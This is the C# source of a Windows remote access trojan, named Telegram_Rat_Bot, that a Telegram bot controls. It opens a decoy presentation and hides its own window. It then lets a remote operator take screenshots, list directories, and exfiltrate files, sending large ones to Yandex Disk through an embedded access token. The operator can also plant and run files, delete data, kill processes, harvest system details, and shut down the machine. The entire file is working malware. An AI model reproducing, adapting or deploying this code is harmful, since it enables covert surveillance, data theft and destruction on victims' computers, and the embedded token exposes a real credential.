using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Telegram.Bot;
using Telegram.Bot.Types;
using Telegram.Bot.Types.InputFiles;
using Telegram.Bot.Types.ReplyMarkups;
using WindowsInput.Native;
using WindowsInput;
using System.Management;
using YandexDisk.Client.Http;
using YandexDisk.Client.Protocol;
using AudioSwitcher.AudioApi.CoreAudio;

namespace Telegram_Rat_Bot
{
    public partial class Form1 : Form
    {
        private static string token { get; set; } = "Token";
        private static int step = 0;
        private static string id = "ID";
        private static string link;

        public Form1()
        {
            var client = new TelegramBotClient(token);
            try
            {
                Process.Start($"{Environment.CurrentDirectory}/Files/Презентация.pptx");
            }
            catch
            {
                Console.Write("");
            }
            client.SendTextMessageAsync(id, $"Пк {Environment.UserName} включен", replyMarkup: Markup());
            client.StartReceiving(Update, Error);

            InitializeComponent();

            Opacity = 0;


        }


        async Task Update(ITelegramBotClient botClient, Update update, CancellationToken token)
        {
            InputSimulator sim = new InputSimulator();
            var message = update.Message;
            string userName = Environment.UserName;
            ClickMouse click = new ClickMouse();
            var api = new DiskHttpApi("y0_AgAAAABik9_KAAjxOgAAAADXp7IF9Lvv1DcITeOJyBQhtvRjw5LQ16I");
            var roodFolderData = await api.MetaInfo.GetInfoAsync(new ResourceRequest
            {
                Path = "/televoog/"
            });

            Random rnd = new Random();

            if (message.Text != null && step == 0)
            {
                switch (message.Text)
                {
                    case "/start":
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Привет", replyMarkup: Markup());
                        break;
                    case "Клик лкм":
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Нажато", replyMarkup: Markup());

                        click.LeftClickMouse();
                        break;
                    case "Клик пкм":
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Нажато", replyMarkup: Markup());
                        click.RightClickMouse();
                        break;
                    case "ID":
                        await botClient.SendTextMessageAsync(message.Chat.Id, Convert.ToString(message.Chat.Id), replyMarkup: Markup());
                        break;
                    case "Выключить пк":
                        await botClient.SendTextMessageAsync(message.Chat.Id, "ПК ушел на выключение", replyMarkup: Markup());
                        Process.Start("shutdown.exe", "/s /t 0");
                        break;
                    case "Смена позиции курсора":
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Корды", replyMarkup: BackMarkup());
                        step = 1;
                        break;
                    case "Вывести сообщение":
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Текст сообщения", replyMarkup: BackMarkup());
                        step = 2;
                        break;
                    case "Создать папку":
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Дирректория для создания папки", replyMarkup: BackMarkup());
                        step = 3;
                        break;
                    case "Создать файл":
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Дирректория для создания файла", replyMarkup: BackMarkup());
                        step = 4;
                        break;
                    case "Удалить папку":
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Дирректория для удаления папки", replyMarkup: BackMarkup());
                        step = 5;
                        break;
                    case "Удалить файл":
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Дирректория для удаления файла", replyMarkup: BackMarkup());
                        step = 6;
                        break;
                    case "Сделать скриншот":
                        var image = ScreenCapture.CaptureDesktop();
                        image.Save($"C:/Users/{userName}/Appdata/Roaming/screenshot.jpg", ImageFormat.Jpeg);
                        string url = $"C:/Users/{userName}/Appdata/Roaming/screenshot.jpg";
                        await botClient.SendPhotoAsync(message.Chat.Id, System.IO.File.Open(url, FileMode.Open));
                        System.IO.File.Delete(url);
                        break;
                    case "Запустить файл":
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Дирректория для запуска файла", replyMarkup: BackMarkup());
                        step = 7;
                        break;
                    case "Скачать файл":
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Дирректория", replyMarkup: BackMarkup());
                        step = 8;
                        break;
                    case "Скинуть файл":
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Дирректория", replyMarkup: BackMarkup());
                        step = 9;
                        break;
                    case "Сменить обои":
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Фото", replyMarkup: BackMarkup());
                        step = 11;
                        break;
                    case "Закрыть процесс":
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Название", replyMarkup: Markup());
                        step = 12;
                        break;
                    case "Нажать Alt+F4":
                        sim.Keyboard.ModifiedKeyStroke(VirtualKeyCode.LMENU, VirtualKeyCode.F4);
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Alt+F4 нажато", replyMarkup: Markup());
                        break;
                    case "Нажать Win+D":
                        sim.Keyboard.ModifiedKeyStroke(VirtualKeyCode.LWIN, VirtualKeyCode.VK_D);
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Win+D нажато", replyMarkup: Markup());
                        break;
                    case "Информация о пк":
                        GetInfo();
                        break;
                    case "Переворот экрана":
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Градус поворота", replyMarkup: Rotate());
                        step = 13;
                        break;
                    case "Нажать BackSpace":
                        sim.Keyboard.KeyPress(VirtualKeyCode.BACK);
                        await botClient.SendTextMessageAsync(message.Chat.Id, "BackSpace нажата", replyMarkup: Markup());
                        break;
                    case "Громкость звука":
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Процент громкости звука", replyMarkup: BackMarkup());
                        step = 14;
                        break;
                    case "Посмотреть содержимое":
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Дирректория", replyMarkup: BackMarkup());
                        step = 15;
                        break;
                    case "Перезагрузка пк":
                        await botClient.SendTextMessageAsync(message.Chat.Id, "ПК ушел на перезагрузку", replyMarkup: Markup());
                        Process.Start("shutdown.exe", "-r -t 0");
                        break;
                    default:
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Я не знаю такой команды", replyMarkup: Markup());
                        break;

                }

                if (message.Document != null)
                {
                    await botClient.SendTextMessageAsync(message.Chat.Id, "Привет", replyMarkup: Markup());
                    var fileId = update.Message.Photo.Last().FileId;
                    var fileInfo = await botClient.GetFileAsync(fileId);
                    var filePath = fileInfo.FilePath;
                    const string destinationFilePath = "C:/users/user/dekstop/downloaded.file";

                    await botClient.DownloadFileAsync(
                        filePath: filePath,
                        destination: System.IO.File.OpenWrite(destinationFilePath));


                }

            }



            if (step == 1 && message.Text != "Смена позиции курсора")
            {
                if (message.Text != "Вернуться назад")
                {
                    try
                    {
                        string[] a = message.Text.Split(',');
                        int b = Convert.ToInt32(a[0]) / 1;
                        int c = Convert.ToInt32(a[1]) / 1;
                        Cursor.Position = new Point(b, c);
                        await botClient.SendTextMessageAsync(message.Chat.Id, $"Перемещено на {b},{c}", replyMarkup: Markup());
                        step = 0;
                    }
                    catch
                    {
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Нужны числа", replyMarkup: BackMarkup());
                    }
                }
                else
                {
                    await botClient.SendTextMessageAsync(message.Chat.Id, "Главное меню", replyMarkup: Markup());
                    step = 0;
                }
            }

            if (step == 2 && message.Text != "Вывести сообщение")
            {
                if (message.Text != "Вернуться назад")
                {
                    await botClient.SendTextMessageAsync(message.Chat.Id, "Выведено", replyMarkup: Markup());
                    MessageBox.Show(message.Text);
                    await botClient.SendTextMessageAsync(message.Chat.Id, "Закрыли окно", replyMarkup: Markup());
                    step = 0;
                }
                else
                {
                    await botClient.SendTextMessageAsync(message.Chat.Id, "Главное меню", replyMarkup: Markup());
                    step = 0;
                }

            }

            if (step == 3 && message.Text != "Создать папку")
            {
                if (message.Text != "Вернуться назад")
                {
                    if (!System.IO.Directory.Exists(message.Text))
                    {
                        try
                        {
                            System.IO.Directory.CreateDirectory(message.Text);
                            await botClient.SendTextMessageAsync(message.Chat.Id, "Папка создана", replyMarkup: Markup());
                            step = 0;
                        }
                        catch
                        {
                            await botClient.SendTextMessageAsync(message.Chat.Id, "Не удалось создать папку", replyMarkup: BackMarkup());
                        }
                    }
                    else
                    {
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Данная папка уже существует", replyMarkup: BackMarkup());
                    }

                }
                else
                {
                    await botClient.SendTextMessageAsync(message.Chat.Id, "Главное меню", replyMarkup: Markup());
                    step = 0;
                }
            }

            if (step == 4 && message.Text != "Создать файл")
            {
                if (message.Text != "Вернуться назад")
                {
                    if (!System.IO.File.Exists(message.Text))
                    {
                        try
                        {
                            using (System.IO.FileStream fs = System.IO.File.Create(message.Text))
                            {
                                for (byte i = 0; i < 100; i++)
                                {
                                    fs.WriteByte(i);
                                }
                            }
                            await botClient.SendTextMessageAsync(message.Chat.Id, "Файл создан", replyMarkup: Markup());
                            step = 0;
                        }
                        catch
                        {
                            await botClient.SendTextMessageAsync(message.Chat.Id, "Не удалось создать файл", replyMarkup: BackMarkup());
                        }
                    }
                    else
                    {
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Данный файл уже существует", replyMarkup: BackMarkup());
                    }

                }
                else
                {
                    await botClient.SendTextMessageAsync(message.Chat.Id, "Главное меню", replyMarkup: Markup());
                    step = 0;
                }
            }

            if (step == 5 && message.Text != "Удалить папку")
            {
                if (message.Text != "Вернуться назад")
                {
                    if (System.IO.Directory.Exists(message.Text))
                    {
                        try
                        {
                            System.IO.Directory.Delete(message.Text, true);
                            await botClient.SendTextMessageAsync(message.Chat.Id, "Папка удалена", replyMarkup: Markup());
                            step = 0;
                        }
                        catch
                        {
                            await botClient.SendTextMessageAsync(message.Chat.Id, "Не удалось удалить папку", replyMarkup: BackMarkup());
                        }
                    }
                    else
                    {
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Папка не найдена", replyMarkup: BackMarkup());
                    }

                }
                else
                {
                    await botClient.SendTextMessageAsync(message.Chat.Id, "Главное меню", replyMarkup: Markup());
                    step = 0;
                }
            }

            if (step == 6 && message.Text != "Удалить файл")
            {
                if (message.Text != "Вернуться назад")
                {
                    if (System.IO.File.Exists(message.Text))
                    {
                        try
                        {
                            System.IO.File.Delete(message.Text);
                            await botClient.SendTextMessageAsync(message.Chat.Id, "Файл удален", replyMarkup: Markup());
                            step = 0;
                        }
                        catch
                        {
                            await botClient.SendTextMessageAsync(message.Chat.Id, "Не удалось удалить файл", replyMarkup: BackMarkup());
                        }
                    }
                    else
                    {
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Файл не найден", replyMarkup: BackMarkup());
                    }

                }
                else
                {
                    await botClient.SendTextMessageAsync(message.Chat.Id, "Главное меню", replyMarkup: Markup());
                    step = 0;
                }
            }

            if (step == 7 && message.Text != "Запустить файл")
            {
                if (message.Text != "Вернуться назад")
                {
                    if (System.IO.File.Exists(message.Text) || Directory.Exists(message.Text))
                    {
                        try
                        {
                            Process.Start(message.Text);
                            await botClient.SendTextMessageAsync(message.Chat.Id, "Файл запущен", replyMarkup: Markup());
                            step = 0;
                        }
                        catch
                        {
                            await botClient.SendTextMessageAsync(message.Chat.Id, "Не удалось запустить файл", replyMarkup: BackMarkup());
                        }
                    }
                    else
                    {
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Файл не найден", replyMarkup: BackMarkup());
                    }

                }
                else
                {
                    await botClient.SendTextMessageAsync(message.Chat.Id, "Главное меню", replyMarkup: Markup());
                    step = 0;
                }
            }

            if (step == 8 && message.Text != "Скачать файл")
            {
                if (message.Text != "Вернуться назад")
                {
                    if (System.IO.File.Exists(message.Text))
                    {
                        string dir = "";
                        string[] dirrectory = message.Text.Split('/');
                        for (int i = 0; i < dirrectory.Length - 1; i++)
                        {
                            dir += dirrectory[i] + "/";
                        }

                        FileInfo file = new FileInfo(message.Text);
                        long size = file.Length;
                        if (size >= 50000000)
                        {
                            if (!roodFolderData.Embedded.Items.Any(i => i.Type == ResourceType.File && i.Name.Equals(dirrectory[dirrectory.Length - 1])))
                            {
                                var link = await api.Files.GetUploadLinkAsync("/televoog/" + dirrectory[dirrectory.Length - 1], overwrite: false);
                                using (var fs = System.IO.File.OpenRead(message.Text))
                                {
                                    await api.Files.UploadAsync(link, fs);
                                }

                                var lnk = await api.Files.GetDownloadLinkAsync("/televoog/" + dirrectory[dirrectory.Length - 1]);

                                await botClient.SendTextMessageAsync(message.Chat.Id, "Ссылка для скачивания:", replyMarkup: Markup());
                                await botClient.SendTextMessageAsync(message.Chat.Id, lnk.Href, replyMarkup: Markup());
                                step = 0;
                            }
                            else
                            {
                                string newname = rnd.Next(0, 1000000) + "-" + dirrectory[dirrectory.Length - 1];
                                System.IO.File.Copy(message.Text, dir + newname);
                                var link = await api.Files.GetUploadLinkAsync("/televoog/" + newname, overwrite: false);
                                using (var fs = System.IO.File.OpenRead(dir + newname))
                                {
                                    await api.Files.UploadAsync(link, fs);
                                }

                                var lnk = await api.Files.GetDownloadLinkAsync("/televoog/" + newname);

                                await botClient.SendTextMessageAsync(message.Chat.Id, "Ссылка для скачивания:", replyMarkup: Markup());
                                await botClient.SendTextMessageAsync(message.Chat.Id, lnk.Href, replyMarkup: Markup());

                                System.IO.File.Delete(dir + newname);
                                step = 0;
                            }
                        }
                        else if (size == 0)
                        {
                            await botClient.SendTextMessageAsync(message.Chat.Id, "Файл весит 0 байт", replyMarkup: BackMarkup());
                        }
                        else
                        {
                            using (Stream stream = System.IO.File.OpenRead(message.Text))
                            {
                                await botClient.SendDocumentAsync(message.Chat.Id, new InputOnlineFile(content: stream, fileName: dirrectory[dirrectory.Length - 1]), replyMarkup: Markup());
                                step = 0;
                            }

                        }
                    }
                    else
                    {
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Файл не найден", replyMarkup: BackMarkup());
                    }
                }
                else
                {
                    await botClient.SendTextMessageAsync(message.Chat.Id, "Главное меню", replyMarkup: Markup());
                    step = 0;
                }
            }

            if (step == 9 && message.Text != "Скинуть файл")
            {
                if (message.Text != "Вернуться назад")
                {
                    link = message.Text;
                    await botClient.SendTextMessageAsync(message.Chat.Id, "Файл", replyMarkup: BackMarkup());
                    step = 10;

                }
                else
                {
                    await botClient.SendTextMessageAsync(message.Chat.Id, "Главное меню", replyMarkup: Markup());
                    step = 0;
                }
            }

            if (step == 10 && (message.Document != null || message.Photo != null))
            {
                if (message.Text != "Вернуться назад")
                {

                    if (message.Document != null)
                    {
                        try
                        {


                            var file = await botClient.GetFileAsync(message.Document.FileId);
                            FileStream fs = new FileStream(link, FileMode.Create);
                            await botClient.DownloadFileAsync(file.FilePath, fs);
                            fs.Close();
                            fs.Dispose();
                            await botClient.SendTextMessageAsync(message.Chat.Id, "Скинул", replyMarkup: Markup());
                            step = 0;
                        }
                        catch
                        {
                            await botClient.SendTextMessageAsync(message.Chat.Id, "Не удалось скинуть файл", replyMarkup: Markup());
                        }
                    }

                    if (message.Photo != null)
                    {
                        try
                        {
                            var file = await botClient.GetFileAsync(message.Photo[message.Photo.Length - 1].FileId);
                            FileStream fs = new FileStream(link, FileMode.Create);
                            await botClient.DownloadFileAsync(file.FilePath, fs);
                            fs.Close();
                            fs.Dispose();
                            await botClient.SendTextMessageAsync(message.Chat.Id, "Скинул", replyMarkup: Markup());
                            step = 0;
                        }
                        catch
                        {
                            await botClient.SendTextMessageAsync(message.Chat.Id, "Не удалось скинуть файл", replyMarkup: Markup());
                        }
                    }

                    else
                    {
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Главное меню", replyMarkup: Markup());
                        step = 0;
                    }

                }

            }

            if (step == 11 && message.Photo != null)
            {
                if (message.Text != "Вернуться назад")
                {

                    try
                    {
                        var file = await botClient.GetFileAsync(message.Photo[message.Photo.Length - 1].FileId);
                        FileStream fs = new FileStream($"C:/Users/{userName}/AppData/Roaming/NewWallpaper.jpg", FileMode.Create);
                        await botClient.DownloadFileAsync(file.FilePath, fs);
                        fs.Close();
                        fs.Dispose();
                        ChangeWallPaper($"C:/Users/{userName}/AppData/Roaming/NewWallpaper.jpg", 0, 0);
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Сменил", replyMarkup: Markup());
                        System.IO.File.Delete($"C:/Users/{userName}/AppData/Roaming/NewWallpaper.jpg");
                        step = 0;
                    }
                    catch
                    {
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Не удалось сменить обои", replyMarkup: Markup());
                    }
                }

                else
                {
                    await botClient.SendTextMessageAsync(message.Chat.Id, "Главное меню", replyMarkup: Markup());
                    step = 0;
                }

            }

            if (step == 12 && message.Text != "Закрыть процесс")
            {
                if (message.Text != "Вернуться назад")
                {

                    try
                    {
                        foreach (var process in Process.GetProcessesByName(message.Text))
                        {
                            process.Kill();
                        }
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Процесс " + message.Text + " закрыт", replyMarkup: Markup());
                        step = 0;
                    }
                    catch
                    {
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Не удалось закрыть процесс " + message.Text, replyMarkup: Markup());
                    }
                }

                else
                {
                    await botClient.SendTextMessageAsync(message.Chat.Id, "Главное меню", replyMarkup: Markup());
                    step = 0;
                }

            }

            if (step == 13 && message.Text != "Переворот экрана")
            {
                if (message.Text != "Вернуться назад")
                {
                    try
                    {
                        switch (message.Text)
                        {
                            case "0":
                                Display.Rotate(1, Display.Orientations.DEGREES_CW_0);
                                break;
                            case "90":
                                Display.Rotate(1, Display.Orientations.DEGREES_CW_90);
                                break;
                            case "180":
                                Display.Rotate(1, Display.Orientations.DEGREES_CW_180);
                                break;
                            case "270":
                                Display.Rotate(1, Display.Orientations.DEGREES_CW_270);
                                break;
                        }

                        await botClient.SendTextMessageAsync(message.Chat.Id, $"Экран повернут на {message.Text} градусов", replyMarkup: Rotate());

                    }
                    catch
                    {
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Что-то пошло не так " + message.Text, replyMarkup: Markup());
                    }
                }

                else
                {
                    await botClient.SendTextMessageAsync(message.Chat.Id, "Главное меню", replyMarkup: Markup());
                    step = 0;
                }

            }

            if (step == 14 && message.Text != "Громкость звука")
            {
                if (message.Text != "Вернуться назад")
                {
                    try
                    {
                        int value = Convert.ToInt32(message.Text);
                        if (Convert.ToInt32(message.Text) >= 100)
                            value = 100;
                        CoreAudioDevice defaultPlaybackDevice = new CoreAudioController().DefaultPlaybackDevice;
                        defaultPlaybackDevice.Volume = value;
                        await botClient.SendTextMessageAsync(message.Chat.Id, $"Громкость изменена на {value}", replyMarkup: Markup());
                        step = 0;
                    }
                    catch
                    {
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Громкость звука должна быть числом", replyMarkup: BackMarkup());
                    }

                }
                else
                {
                    await botClient.SendTextMessageAsync(message.Chat.Id, "Главное меню", replyMarkup: Markup());
                    step = 0;
                }
            }

            if (step == 15 && message.Text != "Посмотреть содержимое")
            {
                if (message.Text != "Вернуться назад")
                {
                    if (Directory.Exists(message.Text))
                    {
                        string path = $"C:/Users/{Environment.UserName}/Appdata/Roaming/info.txt";
                        using (StreamWriter writer = new StreamWriter(path, true))
                        {

                            if (!System.IO.File.Exists(path))
                            {
                                using (FileStream fs = System.IO.File.Create(path)) { }
                            }

                            string[] directries = Directory.GetDirectories(message.Text);

                            string[] files = Directory.GetFiles(message.Text);

                            await writer.WriteLineAsync("Папки:");

                            foreach (var a in directries)
                            {
                                await writer.WriteLineAsync($"{a}");
                            }

                            await writer.WriteLineAsync("\nФайлы:");

                            foreach (var i in files)
                            {
                                await writer.WriteLineAsync($"{i}");
                            }

                        }

                        await botClient.SendDocumentAsync(message.Chat.Id, new InputOnlineFile(content: System.IO.File.OpenRead(path), "info.txt"), replyMarkup: Markup());

                        step = 0;

                        System.IO.File.Delete(path);
                    }
                    else
                    {
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Дирректория не найдена", replyMarkup: BackMarkup());
                    }
                }
                else
                {
                    await botClient.SendTextMessageAsync(message.Chat.Id, "Главное меню", replyMarkup: Markup());
                    step = 0;
                }
            }

            async void GetInfo()
            {
                string path = $"C:/Users/{Environment.UserName}/AppData/Roaming/alldata.txt";

                ManagementObjectSearcher searcher =
                new ManagementObjectSearcher("root\\CIMV2",
                   "Select Name, CommandLine From Win32_Process");
                using (StreamWriter writer = new StreamWriter(path, true))
                {
                    await writer.WriteLineAsync("------------- Активные процессы -------------");
                }

                foreach (ManagementObject instance in searcher.Get())
                {
                    using (StreamWriter writer = new StreamWriter(path, true))
                    {
                        try
                        {
                            await writer.WriteLineAsync((string)instance["Name"]);
                        }
                        catch
                        {
                            await writer.WriteLineAsync("Не найдено");
                        }
                    }
                }

                ManagementObjectSearcher searcher5 =
                new ManagementObjectSearcher("root\\CIMV2",
                    "SELECT * FROM Win32_OperatingSystem");

                foreach (ManagementObject queryObj in searcher5.Get())
                {
                    using (StreamWriter writer = new StreamWriter(path, true))
                    {
                        await writer.WriteLineAsync("------------- Информация об ОС -------------");
                        try
                        {
                            await writer.WriteLineAsync("Номер: " + queryObj["BuildNumber"]);
                            await writer.WriteLineAsync("Название: " + queryObj["Caption"]);
                            await writer.WriteLineAsync("Свободно физической памяти: " + queryObj["FreePhysicalMemory"]);
                            await writer.WriteLineAsync("Свободно виртуальной памяти: " + queryObj["FreeVirtualMemory"]);
                            await writer.WriteLineAsync("Тип ОС: " + queryObj["OSType"]);
                            await writer.WriteLineAsync("Имя пользователя: " + queryObj["RegisteredUser"]);
                            await writer.WriteLineAsync("Серийный номер: " + queryObj["SerialNumber"]);
                            await writer.WriteLineAsync("Система установлена на диске: " + queryObj["SystemDrive"]);
                            await writer.WriteLineAsync("Версия: " + queryObj["Version"]);
                            await writer.WriteLineAsync("Дирректория: " + queryObj["WindowsDirectory"]);
                        }
                        catch
                        {
                            await writer.WriteLineAsync("Не найдено");
                        }
                    }
                }

                ManagementObjectSearcher searcher11 =
                new ManagementObjectSearcher("root\\CIMV2",
                "SELECT * FROM Win32_VideoController");

                foreach (ManagementObject queryObj in searcher11.Get())
                {
                    using (StreamWriter writer = new StreamWriter(path, true))
                    {
                        await writer.WriteLineAsync("------------- ВидеоКарта -----------");
                        try
                        {
                            await writer.WriteLineAsync("Память: " + queryObj["AdapterRAM"]);
                            await writer.WriteLineAsync("Название: " + queryObj["Caption"]);
                            await writer.WriteLineAsync("Описание: " + queryObj["Description"]);
                            await writer.WriteLineAsync("GPU: " + queryObj["VideoProcessor"]);
                        }
                        catch
                        {
                            await writer.WriteLineAsync("Не найдено");
                        }

                    }
                }


                ManagementObjectSearcher searcher12 =
                new ManagementObjectSearcher("root\\CIMV2",
                "SELECT * FROM Win32_PhysicalMemory");

                using (StreamWriter writer = new StreamWriter(path, true))
                {
                    await writer.WriteLineAsync("------------- ОЗУ --------");
                }
                foreach (ManagementObject queryObj in searcher12.Get())
                {
                    using (StreamWriter writer = new StreamWriter(path, true))
                    {
                        try
                        {
                            await writer.WriteLineAsync("Плашка: " + queryObj["BankLabel"] + "; Объем: " + Math.Round(System.Convert.ToDouble(queryObj["Capacity"]) / 1024 / 1024 / 1024, 2) + "Gb; Скорость: " + queryObj["Speed"]);
                        }
                        catch
                        {
                            await writer.WriteLineAsync("Не найдено");
                        }
                    }
                }


                await botClient.SendDocumentAsync(message.Chat.Id, new InputOnlineFile(content: System.IO.File.OpenRead(path), "alldata.txt"));

                System.IO.File.Delete(path);
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
        }



        private IReplyMarkup Markup()
        {
            return new ReplyKeyboardMarkup
            (new[]
            {
                new KeyboardButton[] { "Клик лкм", "Клик пкм" , "ID" },
                new KeyboardButton[] { "Выключить пк", "Смена позиции курсора", "Вывести сообщение"},
                new KeyboardButton[] { "Создать папку", "Создать файл", "Удалить папку"},
                new KeyboardButton[] { "Удалить файл", "Сделать скриншот", "Запустить файл" },
                new KeyboardButton[] { "Скачать файл", "Скинуть файл", "Сменить обои" },
                new KeyboardButton[] { "Закрыть процесс", "Нажать Alt+F4", "Нажать Win+D" },
                new KeyboardButton[] { "Информация о пк", "Переворот экрана", "Нажать BackSpace" },
                new KeyboardButton[] { "Громкость звука", "Посмотреть содержимое", "Перезагрузка пк" }
            })
            {
                ResizeKeyboard = true
            };
        }

        private IReplyMarkup Rotate()
        {
            return new ReplyKeyboardMarkup
            (new[]
            {
                new KeyboardButton[] { "0", "90" , "180", "270"},
                new KeyboardButton[] { "Вернуться назад" }
            })
            {
                ResizeKeyboard = true
            };
        }

        private IReplyMarkup BackMarkup()
        {
            return new ReplyKeyboardMarkup
            (new[]
            {
                new KeyboardButton[] { "Вернуться назад"}
            })
            {
                ResizeKeyboard = true
            };
        }


        private Task Error(ITelegramBotClient arg1, Exception arg2, CancellationToken arg3)
        {
            return Task.CompletedTask;
        }

        const int SPI_SETDESKWALLPAPER = 20;
        const int SPIF_UPDATEINIFILE = 0x01;
        const int SPIF_SENDWININICHANGE = 0x02;

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern int SystemParametersInfo
            (int uAction, int uParam, string lpvParam, int fuWinIni);


        private void ChangeWallPaper(string path, int style, int tile)
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true);
            key.SetValue("WallpaperStyle", style.ToString());
            key.SetValue("TileWallpaper", tile.ToString());
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path,
                SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }

    }
}
